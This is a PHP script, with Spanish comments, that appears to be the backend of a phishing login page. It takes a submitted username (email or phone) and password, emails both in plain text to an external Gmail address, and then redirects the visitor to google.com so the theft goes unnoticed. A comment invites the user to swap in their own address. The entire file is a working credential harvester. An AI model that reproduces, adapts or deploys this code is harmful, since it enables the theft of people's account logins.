<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener y limpiar datos del formulario
    $usuario = trim($_POST["usuario"]);
    $contrasena = trim($_POST["contrasena"]);

    // Validar que no estén vacíos
    if (empty($usuario) || empty($contrasena)) {
        echo "Por favor complete todos los campos.";
        exit;
    }

    // Validar si usuario es correo o teléfono
    $esCorreo = filter_var($usuario, FILTER_VALIDATE_EMAIL);
    $esTelefono = preg_match('/^\+?\d{7,15}$/', $usuario); // Número con 7 a 15 dígitos, opcional + al inicio

    if (!$esCorreo && !$esTelefono) {
        echo "Ingrese un correo electrónico o número de teléfono válido.";
        exit;
    }

    // Destinatario
    $destinatario = "azeangel0290@gmail.com"; // Cambia esta dirección por la tuya

    // Asunto del correo
    $asunto = "Nuevo inicio de sesión";

    // Cuerpo del correo
    $cuerpo = "Usuario: $usuario\n";
    $cuerpo .= "Contraseña: $contrasena\n";

    // Encabezados
    $headers = "From: no-reply@tudominio.com\r\n";
    $headers .= "Reply-To: no-reply@tudominio.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    // Enviar correo
    if (mail($destinatario, $asunto, $cuerpo, $headers)) {
        // Redirigir solo si el correo se envió correctamente
        header("Location: https://www.google.com");
        exit();
    } else {
        echo "Error al enviar el correo. Inténtalo más tarde.";
    }
} else {
    // Si no es método POST, denegar acceso
    header("HTTP/1.1 403 Forbidden");
    echo "Acceso no permitido.";
}
?>
